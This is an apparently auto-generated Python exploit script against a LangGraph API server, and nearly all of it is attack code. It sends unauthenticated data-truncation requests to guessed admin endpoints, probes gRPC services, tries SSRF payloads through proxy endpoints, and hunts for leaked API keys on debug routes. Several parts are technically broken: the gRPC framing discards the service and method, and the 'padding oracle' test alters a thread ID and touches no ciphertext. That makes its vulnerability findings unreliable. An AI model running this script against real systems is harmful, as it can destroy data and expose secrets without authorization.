#!/usr/bin/env python3
# PoC for langgraph_api_src (/tmp/lg-api-dl/langgraph_api_src)
# Path: langgraph-001
# Sink: get_json_decryptor
# Auto-generated — run with: python3 langgraph_specific_vulnerabilities_get_json_decryptor.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept Exploit for LangGraph API - Multiple Vulnerabilities

This script demonstrates the following vulnerabilities:
1. Unauthenticated gRPC access (Admin Truncate endpoint)
2. SSRF chaining from HTTP to gRPC on localhost:50051
3. Potential for msgpack RCE via checkpoint_blobs (requires DB write access)
4. AES-CBC padding oracle vulnerability (demonstrated via timing)

WARNING: This is for educational/authorized testing purposes only.
Use only on systems you own or have explicit permission to test.
"""

import argparse
import json
import socket
import struct
import sys
import time
import uuid
from typing import Optional

import requests


# Configuration
DEFAULT_TARGET = "http://localhost:8000"
DEFAULT_GRPC_HOST = "localhost"
DEFAULT_GRPC_PORT = 50051
TIMEOUT = 10


def create_grpc_packet(service: str, method: str, payload: bytes) -> bytes:
    """
    Create a minimal gRPC HTTP/2 frame for sending requests.
    This is a simplified version for PoC purposes.
    """
    # gRPC uses HTTP/2, but we'll use a simple TCP connection
    # with the gRPC wire format
    prefix = b'\x00'  # compressed flag
    length = struct.pack('>I', len(payload))
    return prefix + length + payload


def send_grpc_request(
    host: str,
    port: int,
    service: str,
    method: str,
    payload: bytes,
    timeout: int = TIMEOUT
) -> Optional[bytes]:
    """
    Send a raw gRPC request to the specified service.
    This demonstrates unauthenticated access to gRPC services.
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))
        
        # Send HTTP/2 preface (simplified)
        preface = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'
        sock.send(preface)
        
        # Create gRPC request frame
        grpc_frame = create_grpc_packet(service, method, payload)
        sock.send(grpc_frame)
        
        # Read response
        response = sock.recv(4096)
        sock.close()
        return response
    except Exception as e:
        print(f"[!] gRPC connection error: {e}")
        return None


def test_admin_truncate(target: str) -> bool:
    """
    Test the Admin Truncate endpoint for unauthenticated access.
    This endpoint can delete all data without authentication.
    """
    print("[*] Testing Admin Truncate endpoint...")
    
    # Try to access the admin truncate endpoint
    endpoints = [
        f"{target}/admin/truncate",
        f"{target}/api/admin/truncate",
        f"{target}/v1/admin/truncate",
    ]
    
    for endpoint in endpoints:
        try:
            response = requests.post(
                endpoint,
                json={"confirm": True},
                timeout=TIMEOUT
            )
            if response.status_code in [200, 202, 204]:
                print(f"[+] Admin Truncate accessible at {endpoint}")
                print(f"[+] Response: {response.status_code}")
                return True
            elif response.status_code == 401:
                print(f"[-] Admin Truncate requires auth at {endpoint}")
            else:
                print(f"[?] Unexpected response at {endpoint}: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"[!] Error accessing {endpoint}: {e}")
    
    return False


def test_grpc_services(host: str, port: int) -> bool:
    """
    Test gRPC services for unauthenticated access.
    Attempts to connect to various gRPC services.
    """
    print(f"[*] Testing gRPC services at {host}:{port}...")
    
    # Common gRPC service names for LangGraph
    services = [
        "Admin",
        "Assistants",
        "Cache",
        "Crons",
        "Runs",
        "Threads",
        "Checkpointer"
    ]
    
    for service in services:
        # Try to send a simple request to each service
        payload = json.dumps({"service": service}).encode()
        response = send_grpc_request(host, port, service, "List", payload)
        
        if response:
            print(f"[+] gRPC service '{service}' is accessible")
            print(f"[+] Response length: {len(response)} bytes")
            return True
        else:
            print(f"[-] gRPC service '{service}' not accessible")
    
    return False


def test_ssrf_chain(target: str, grpc_host: str, grpc_port: int) -> bool:
    """
    Test SSRF chaining from HTTP to gRPC.
    The Python HTTP layer can reach gRPC on localhost:50051.
    """
    print("[*] Testing SSRF chaining...")
    
    # Try to use HTTP endpoints that might proxy to gRPC
    ssrf_payloads = [
        f"http://{grpc_host}:{grpc_port}/",
        f"grpc://{grpc_host}:{grpc_port}/",
        f"localhost:{grpc_port}",
    ]
    
    for payload in ssrf_payloads:
        try:
            # Try various endpoints that might accept URLs
            endpoints = [
                f"{target}/api/proxy",
                f"{target}/v1/proxy",
                f"{target}/proxy",
            ]
            
            for endpoint in endpoints:
                response = requests.post(
                    endpoint,
                    json={"url": payload},
                    timeout=TIMEOUT
                )
                if response.status_code != 404:
                    print(f"[+] SSRF possible via {endpoint}")
                    print(f"[+] Payload: {payload}")
                    print(f"[+] Response: {response.status_code}")
                    return True
        except requests.exceptions.RequestException as e:
            print(f"[!] Error during SSRF test: {e}")
    
    return False


def test_padding_oracle(target: str) -> bool:
    """
    Test for AES-CBC padding oracle vulnerability.
    This demonstrates the vulnerability by sending modified ciphertexts
    and observing timing differences.
    """
    print("[*] Testing AES-CBC padding oracle...")
    
    # Create a test thread with encrypted data
    test_thread_id = str(uuid.uuid4())
    
    try:
        # Create a thread with some data
        create_response = requests.post(
            f"{target}/threads",
            json={
                "thread_id": test_thread_id,
                "metadata": {"test": "data"}
            },
            timeout=TIMEOUT
        )
        
        if create_response.status_code in [200, 201]:
            # Get the thread data
            get_response = requests.get(
                f"{target}/threads/{test_thread_id}",
                timeout=TIMEOUT
            )
            
            if get_response.status_code == 200:
                thread_data = get_response.json()
                
                # Check if encryption markers are present
                if "__encryption_context__" in str(thread_data):
                    print("[+] Encryption markers found - potential padding oracle")
                    
                    # Test timing differences with modified ciphertexts
                    for i in range(3):
                        start_time = time.time()
                        # Try to access with modified thread ID
                        modified_id = test_thread_id[:-1] + chr(ord(test_thread_id[-1]) ^ 1)
                        response = requests.get(
                            f"{target}/threads/{modified_id}",
                            timeout=TIMEOUT
                        )
                        elapsed = time.time() - start_time
                        print(f"[*] Request {i+1} took {elapsed:.3f}s")
                    
                    return True
                else:
                    print("[-] No encryption markers found")
        else:
            print(f"[-] Failed to create test thread: {create_response.status_code}")
            
    except requests.exceptions.RequestException as e:
        print(f"[!] Error during padding oracle test: {e}")
    
    return False


def test_msgpack_rce(target: str) -> bool:
    """
    Test for msgpack RCE via ext_hook deserialization.
    This requires DB write access to checkpoint_blobs.
    """
    print("[*] Testing msgpack RCE potential...")
    
    # Check if we can access checkpoint-related endpoints
    try:
        # Try to access checkpoint data
        response = requests.get(
            f"{target}/checkpoints",
            timeout=TIMEOUT
        )
        
        if response.status_code != 404:
            print("[+] Checkpoint endpoints accessible")
            
            # Check for msgpack usage in responses
            if "msgpack" in response.text.lower() or "ext_hook" in response.text.lower():
                print("[+] msgpack deserialization detected")
                print("[!] Potential RCE if attacker can write to checkpoint_blobs")
                return True
            else:
                print("[-] No msgpack indicators found")
        else:
            print("[-] Checkpoint endpoints not accessible")
            
    except requests.exceptions.RequestException as e:
        print(f"[!] Error during msgpack test: {e}")
    
    return False


def test_api_key_leak(target: str) -> bool:
    """
    Test for API key leakage via error messages or SSRF.
    """
    print("[*] Testing API key leakage...")
    
    # Try various endpoints that might leak environment variables
    leak_endpoints = [
        f"{target}/debug/env",
        f"{target}/api/debug",
        f"{target}/v1/debug",
        f"{target}/error",
        f"{target}/api/error",
    ]
    
    for endpoint in leak_endpoints:
        try:
            response = requests.get(endpoint, timeout=TIMEOUT)
            if response.status_code != 404:
                print(f"[+] Potential leak endpoint: {endpoint}")
                print(f"[+] Response: {response.text[:500]}")
                
                # Check for common API key patterns
                key_patterns = ["API_KEY", "SECRET", "TOKEN", "PASSWORD"]
                for pattern in key_patterns:
                    if pattern in response.text:
                        print(f"[!] Found potential secret: {pattern}")
                        return True
        except requests.exceptions.RequestException as e:
            print(f"[!] Error accessing {endpoint}: {e}")
    
    return False


def main():
    parser = argparse.ArgumentParser(
        description="LangGraph API Vulnerability PoC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --target http://localhost:8000
  %(prog)s --target http://192.168.1.100:8000 --grpc-host 192.168.1.100
  %(prog)s --target http://example.com --all
        """
    )
    
    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help=f"Target URL (default: {DEFAULT_TARGET})"
    )
    parser.add_argument(
        "--grpc-host",
        default=DEFAULT_GRPC_HOST,
        help=f"gRPC host (default: {DEFAULT_GRPC_HOST})"
    )
    parser.add_argument(
        "--grpc-port",
        type=int,
        default=DEFAULT_GRPC_PORT,
        help=f"gRPC port (default: {DEFAULT_GRPC_PORT})"
    )
    parser.add_argument(
        "--all",
        action="store_true",
        help="Run all tests"
    )
    parser.add_argument(
        "--admin-truncate",
        action="store_true",
        help="Test Admin Truncate vulnerability"
    )
    parser.add_argument(
        "--grpc",
        action="store_true",
        help="Test gRPC services"
    )
    parser.add_argument(
        "--ssrf",
        action="store_true",
        help="Test SSRF chaining"
    )
    parser.add_argument(
        "--padding-oracle",
        action="store_true",
        help="Test padding oracle vulnerability"
    )
    parser.add_argument(
        "--msgpack",
        action="store_true",
        help="Test msgpack RCE potential"
    )
    parser.add_argument(
        "--api-key-leak",
        action="store_true",
        help="Test API key leakage"
    )
    
    args = parser.parse_args()
    
    # If no specific test is selected, run all
    if not any([args.all, args.admin_truncate, args.grpc, args.ssrf,
                args.padding_oracle, args.msgpack, args.api_key_leak]):
        args.all = True
    
    print("=" * 60)
    print("LangGraph API Vulnerability Proof-of-Concept")
    print("=" * 60)
    print(f"Target: {args.target}")
    print(f"gRPC: {args.grpc_host}:{args.grpc_port}")
    print("=" * 60)
    
    results = []
    
    if args.all or args.admin_truncate:
        print("\n[1] Testing Admin Truncate Vulnerability")
        print("-" * 40)
        result = test_admin_truncate(args.target)
        results.append(("Admin Truncate", result))
    
    if args.all or args.grpc:
        print("\n[2] Testing gRPC Services")
        print("-" * 40)
        result = test_grpc_services(args.grpc_host, args.grpc_port)
        results.append(("gRPC Services", result))
    
    if args.all or args.ssrf:
        print("\n[3] Testing SSRF Chaining")
        print("-" * 40)
        result = test_ssrf_chain(args.target, args.grpc_host, args.grpc_port)
        results.append(("SSRF Chaining", result))
    
    if args.all or args.padding_oracle:
        print("\n[4] Testing Padding Oracle Vulnerability")
        print("-" * 40)
        result = test_padding_oracle(args.target)
        results.append(("Padding Oracle", result))
    
    if args.all or args.msgpack:
        print("\n[5] Testing msgpack RCE Potential")
        print("-" * 40)
        result = test_msgpack_rce(args.target)
        results.append(("msgpack RCE", result))
    
    if args.all or args.api_key_leak:
        print("\n[6] Testing API Key Leakage")
        print("-" * 40)
        result = test_api_key_leak(args.target)
        results.append(("API Key Leak", result))
    
    # Summary
    print("\n" + "=" * 60)
    print("SUMMARY")
    print("=" * 60)
    
    for test_name, result in results:
        status = "VULNERABLE" if result else "NOT DETECTED"
        print(f"[{'!' if result else '-'}] {test_name}: {status}")
    
    print("=" * 60)
    print("\nNote: This PoC demonstrates potential vulnerabilities.")
    print("Actual exploitation may require additional steps or conditions.")
    print("Always obtain proper authorization before testing.")


if __name__ == "__main__":
    main()
